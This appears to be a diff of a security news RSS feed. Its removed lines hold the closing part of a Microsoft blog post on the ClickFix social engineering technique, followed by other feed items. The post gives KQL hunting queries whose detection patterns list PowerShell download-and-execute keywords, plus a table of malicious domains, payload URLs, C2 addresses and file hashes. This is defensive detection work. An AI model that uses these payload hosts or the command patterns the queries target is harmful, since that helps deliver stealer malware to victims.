-&lt;h3 class="wp-block-heading" id="microsoft-defender-for-office-365"&gt;Microsoft Defender for Office 365&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender for Office 365 detects malicious activity associated with this threat through the following alerts:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;A potentially malicious URL click was detected&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Email messages containing malicious URL removed after delivery&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Email messages removed after delivery&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;A user clicked through to a potentially malicious URL&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious email sending patterns detected&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Email reported by user as malware or phish&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="microsoft-security-copilot"&gt;Microsoft Security Copilot&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Security Copilot customers can use the standalone experience to &lt;a href="https://learn.microsoft.com/en-us/copilot/security/prompting-security-copilot#create-your-own-prompts"&gt;create their own prompts&lt;/a&gt; or run the following &lt;a href="https://learn.microsoft.com/en-us/copilot/security/using-promptbooks"&gt;pre-built promptbooks&lt;/a&gt; to automate incident response or investigation tasks related to this threat:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;Check impact of an external threat article&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious script analysis&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Threat actor profile&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Threat Intelligence 360 report based on MDTI article&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Vulnerability impact assessment&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="threat-intelligence-reports"&gt;Threat intelligence reports&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="microsoft-defender-threat-intelligence"&gt;Microsoft Defender Threat Intelligence&lt;/h3&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/57d43abe-28c3-4f9d-af11-30f51d6bb03c"&gt;DarkGate malware samples delivered through fake Notion websites followed by ClickFix technique&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/939493e1-2ebc-403e-b3fc-0246be4cc88b"&gt;ClickFix and spoofed IT apps deliver RATs via Node.js over Cloudflare Quick Tunnels&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/a35f0e20-be8d-4c5c-b12a-3775b546d3e0"&gt;Phishing campaign impersonates Booking.com, delivers multiple commodity malware types&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/640d3a2d-f0a5-4ed4-8ed0-2dea7a3bb8e0"&gt;Storm-1877 evolving tactics to target users with ClickFix attacks&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/955c7bdb-c5fa-40b4-90f4-6666cce5b8b3"&gt;Email phishing campaign leads to Xworm&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/intel-explorer/articles/efc9e757"&gt;ClickFix technique leverages clipboard to run malicious commands&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/intel-explorer/articles/2f3ef2f1"&gt;Lampion Is Back With ClickFix Lures&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Security Copilot customers can also use the &lt;a href="https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&amp;amp;toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti"&gt;Microsoft Security Copilot integration&lt;/a&gt; in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the &lt;a href="https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr"&gt;embedded experience&lt;/a&gt; in the Microsoft Defender portal to get more information about this threat actor.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="hunting-queries"&gt;Hunting queries&lt;/h2&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="microsoft-defender-xdr"&gt;Microsoft Defender XDR&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender XDR customers can run the following query to find related activity in their networks:&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;ClickFix commands execution&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Identify ClickFix commands execution.&lt;/p&gt;
-
-
-&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
-DeviceRegistryEvents
-| where ActionType =~ "RegistryValueSet"
-| where InitiatingProcessFileName =~ "explorer.exe"
-| where RegistryKey has @"\CurrentVersion\Explorer\RunMRU"
-| where RegistryValueData has "✅"
-        or (RegistryValueData has_any ("powershell", "mshta", "curl", "msiexec", "^")
-             and RegistryValueData matches regex "[\u0400-\u04FF\u0370-\u03FF\u0590-\u05FF\u0600-\u06FF\u0E00-\u0E7F\u2C80-\u2CFF\u13A0-\u13FF\u0530-\u058F\u10A0-\u10FF\u0900-\u097F]")
-        or (RegistryValueData has "mshta" and RegistryValueName !~ "MRUList" and RegistryValueData !in~ ("mshta.exe\\1", "mshta\\1"))
-        or (RegistryValueData has_any ("bitsadmin", "forfiles", "ProxyCommand=") and RegistryValueName !~ "MRUList")
-        or ((RegistryValueData startswith "cmd" or RegistryValueData startswith "powershell")
-            and (RegistryValueData has_any ("-W Hidden ", " -eC ", "curl", "E:jscript", "ssh", "Invoke-Expression", "UtcNow", "Floor", "DownloadString", "DownloadFile", "FromBase64String",  "System.IO.Compression", "System.IO.MemoryStream", "iex", "Invoke-WebRequest", "iwr", "Get-ADDomainController", "InstallProduct", "-w h", "-X POST", "Invoke-RestMethod", "-NoP -W", ".InVOKe", "-useb", "irm ", "^", "[char]", "[scriptblock]", "-UserAgent", "UseBasicParsing", ".Content")
-              or RegistryValueData matches regex @"[-/–][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\s[A-Za-z0-9+/=]{15,}"))
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Lampion malware activity&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The following query searches for PowerShell command associated with Lampion malware activity that is used to download malicious files.&lt;/p&gt;
-
-
-&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
-DeviceProcessEvents 
-| where InitiatingProcessFileName == "powershell.exe" 
-| where InitiatingProcessParentFileName == "explorer.exe" 
-| where FileName has_any ("WScript.exe") 
-| where ProcessCommandLine contains "\"PowerShell.exe\" -windowstyle minimized -Command" 
-and ProcessCommandLine has "Invoke-WebRequest"
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3 class="wp-block-heading" id="microsoft-sentinel"&gt;Microsoft Sentinel&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the &lt;a href="https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy"&gt;Microsoft Sentinel Content Hub&lt;/a&gt; to have the analytics rule deployed in their Sentinel workspace.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Below are the queries using&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/sentinel/normalization"&gt;Sentinel Advanced Security Information Model (ASIM) functions&lt;/a&gt;&amp;nbsp;to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces&amp;nbsp;&lt;a href="https://aka.ms/DeployASIM"&gt;from GitHub&lt;/a&gt;, using an ARM template or manually&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Detect network IP and domain indicators of compromise using ASIM&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser:&lt;/p&gt;
-
-
-&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
-//IP list and domain list- _Im_NetworkSession
-let lookback = 30d;
-let ioc_ip_addr = dynamic(["185.234.72.186", "45.94.31.176", "3.138.123.13", "16.171.23.221", "3.23.103.13", "83.242.96.159", "5.8.9.77"]);
-let ioc_domains = dynamic(["mein-lonos-cloude.de", "derko-meru.online", "objectstorage.ap-singapore-2.oraclecloud.com", "tesra.shop", "zzzp.live", "cqsf.live", "access-ssa-gov.es", "binancepizza.info", "panel-spectrum.net"]);
-_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
-| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains)
-| summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated),
-  EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Detect network and files hashes indicators of compromise using ASIM&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser:&lt;/p&gt;
-
-
-&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
-//IP list - _Im_WebSession
-let lookback = 30d;
-let ioc_ip_addr = dynamic(["185.234.72.186", "45.94.31.176", "3.138.123.13", "16.171.23.221", "3.23.103.13", "83.242.96.159", "5.8.9.77"]);
-let ioc_sha_hashes =dynamic(["061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8", "592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718", "8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629", "d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9", "f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab"]);
-_Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now())
-| where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes)
-| summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated),
-  EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor
-
-// Domain list - _Im_WebSession
-let ioc_domains = dynamic(["mein-lonos-cloude.de", "derko-meru.online", "objectstorage.ap-singapore-2.oraclecloud.com", "tesra.shop", "zzzp.live", "cqsf.live", "access-ssa-gov.es", "binancepizza.info", "panel-spectrum.net"]);
-_Im_WebSession (url_has_any = ioc_domains)
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Detect files hashes indicators of compromise using ASIM&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The following query checks IP addresses and file hash IOCs across data sources supported by ASIM file event parser:&lt;/p&gt;
-
-
-&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
-// file hash list - imFileEvent
-let ioc_sha_hashes = dynamic(["061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8", "592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718", "8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629", "d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9", "f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab"]);
-imFileEvent
-| where SrcFileSHA256 in (ioc_sha_hashes) or
-TargetFileSHA256 in (ioc_sha_hashes)
-| extend AccountName = tostring(split(User, @'')[1]), 
-  AccountNTDomain = tostring(split(User, @'')[0])
-| extend AlgorithmType = "SHA256"
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2 class="wp-block-heading" id="indicators-of-compromise"&gt;Indicators of compromise&lt;/h2&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Indicator&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Type&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;First seen&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Last seen&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;mein-lonos-cloude[.]de&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;Actor-controlled ClickFix landing page used in a MintsLoader campaign&lt;/td&gt;&lt;td&gt;2025-03-26&lt;/td&gt;&lt;td&gt;2025-03-26&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;derko-meru[.]online&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;MintsLoader C2&lt;/td&gt;&lt;td&gt;2025-03-26&lt;/td&gt;&lt;td&gt;2025-03-26&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;tesra[.]shop&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;Domain used in ClickFix command (entered into &lt;em&gt;Run&lt;/em&gt; dialog) in a Lumma Stealer malvertising campaign&lt;/td&gt;&lt;td&gt;2025-04-02&lt;/td&gt;&lt;td&gt;2025-04-02&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;cqsf[.]live&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;Domain used in ClickFix command (entered into &lt;em&gt;Run&lt;/em&gt; dialog) in the Latrodectus drive-by campaign&lt;/td&gt;&lt;td&gt;2025-05-14&lt;/td&gt;&lt;td&gt;2025-05-14&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;access-ssa-gov[.]es&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;ClickFix landing page used in a phishing campaign impersonating Social Security Administration (SSA)&lt;/td&gt;&lt;td&gt;2025-06-02&lt;/td&gt;&lt;td&gt;2025-06-02 &amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;binancepizza[.]info&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;ClickFix landing page&lt;/td&gt;&lt;td&gt;2025-05-22&lt;/td&gt;&lt;td&gt;2025-05-22&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;panel-spectrum[.]net&lt;/em&gt;&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;ClickFix landing page used in a Atomic macOS Stealer (AMOS) campaign&lt;/td&gt;&lt;td&gt;2025-05-30 &amp;nbsp;&lt;/td&gt;&lt;td&gt;2025-05-30 &amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;access-ssa-gov[.]es/ClientSetup.exe&lt;/em&gt;&lt;/td&gt;&lt;td&gt;URL&lt;/td&gt;&lt;td&gt;URL used in ClickFix command (entered into &lt;em&gt;Run &lt;/em&gt;dialog) in the SSA phishing campaign&lt;/td&gt;&lt;td&gt;2025-06-02 &amp;nbsp;&lt;/td&gt;&lt;td&gt;2025-06-02 &amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;applemacios[.]com/vv/install.sh&lt;/em&gt;&lt;/td&gt;&lt;td&gt;URL&lt;/td&gt;&lt;td&gt;URL used in ClickFix command (entered in the &lt;em&gt;Bash &lt;/em&gt;shell) in the AMOS campaign&lt;/td&gt;&lt;td&gt;2025-05-30&lt;/td&gt;&lt;td&gt;2025-05-30&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;applemacios[.]com/vv/update&lt;/em&gt;&lt;/td&gt;&lt;td&gt;URL&lt;/td&gt;&lt;td&gt;URL used in the AMOS campaign to download the AMOS payload&lt;/td&gt;&lt;td&gt;2025-05-30&lt;/td&gt;&lt;td&gt;2025-05-30&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;guildmerger[.]co/verify/eminem&lt;/em&gt;&lt;/td&gt;&lt;td&gt;URL&lt;/td&gt;&lt;td&gt;ClickFix landing page used in OBSCURE#BAT campaign&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;files.catbox[.]moe/snenal.bat&lt;/em&gt;&lt;/td&gt;&lt;td&gt;URL&lt;/td&gt;&lt;td&gt;URL used in ClickFix command (entered into &lt;em&gt;Run&lt;/em&gt; dialog) in the OBSCURE#BAT campaign&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;185.234.72[.]186&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in OBSCURE#BAT campaign for C2&lt;/td&gt;&lt;td&gt;2025-02-24&lt;/td&gt;&lt;td&gt;2025-02-24&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;45.94.31[.]176&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in OBSCURE#BAT campaign for C2&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;td&gt;2025-03-27&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3.138.123[.]13&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in ClickFix command (entered into &lt;em&gt;Run&lt;/em&gt; dialog) in the Lampion phishing campaign&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;td&gt;2025-05-06 &amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;16.171.23[.]221&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in Lampion malware campaign to download additional payloads&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3.23.103[.]13&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in Lampion malware campaign for C2&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;83.242.96[.]159&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in Lampion malware campaign for C2&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5.8.9[.]77&lt;/td&gt;&lt;td&gt;IP address&lt;/td&gt;&lt;td&gt;IP address used in Lampion malware campaign for C2&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;td&gt;2025-05-06&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="references"&gt;References&lt;/h2&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/"&gt;https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers"&gt;https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="learn-more"&gt;Learn more&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To know how Microsoft can help your team stop similar threats and prevent future compromise with human-led managed services, check out&amp;nbsp;&lt;a href="https://www.microsoft.com/security/business/services/microsoft-defender-experts-xdr"&gt;Microsoft Defender Experts for XDR&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;For the latest security research from the Microsoft Threat Intelligence community, check out the &lt;a href="https://aka.ms/threatintelblog"&gt;Microsoft Threat Intelligence Blog&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To get notified about new publications and to join discussions on social media, follow us on &lt;a href="https://www.linkedin.com/showcase/microsoft-threat-intelligence"&gt;LinkedIn&lt;/a&gt;, &lt;a href="https://x.com/MsftSecIntel"&gt;X (formerly Twitter)&lt;/a&gt;, and &lt;a href="https://bsky.app/profile/threatintel.microsoft.com"&gt;Bluesky&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the &lt;a href="https://thecyberwire.com/podcasts/microsoft-threat-intelligence"&gt;Microsoft Threat Intelligence podcast&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/"&gt;Think before you Click(Fix): Analyzing the ClickFix social engineering technique&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.microsoft.com/en-us/security/blog/?p=141805</guid></item><item><title>CISA Releases Three Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/08/21/cisa-releases-three-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released three Industrial Control Systems (ICS) advisories on August 21, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/resource-library/it-policy/encryption-policy/"&gt;Encryption Policy&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/encryption-policy/</guid><category>Cybersecurity</category><category>Data</category><category>IT Resources</category></item><item><title>Leadership, Innovation, and the Future of AI: Lessons from Trend Micro CEO &amp; Co-Founder Eva Chen</title><link>https://www.trendmicro.com/en_us/research/25/h/eva-chen-future-of-ai.html</link><description>Discover how AI is reshaping cybersecurity through our CEO, Eva Chen’s industry briefing series. Gain practical strategies, real-world insights, and a clear roadmap to secure your AI initiatives with confidence.</description><guid isPermaLink="false">urn:uuid:69512dc3-1504-89b3-bc4e-3f1b8976d44e</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category></item><item><title>CISA Releases Three Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/08/21/cisa-releases-three-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released three Industrial Control Systems (ICS) advisories on August 21, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;ICSA-25-233-01 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-233-01"&gt;Mitsubishi Electric Corporation MELSEC iQ-F Series CPU Module&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;ICSA-25-177-01 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-177-01"&gt;Mitsubishi Electric Air Conditioning Systems (Update A)&lt;/a&gt;&lt;/li&gt;
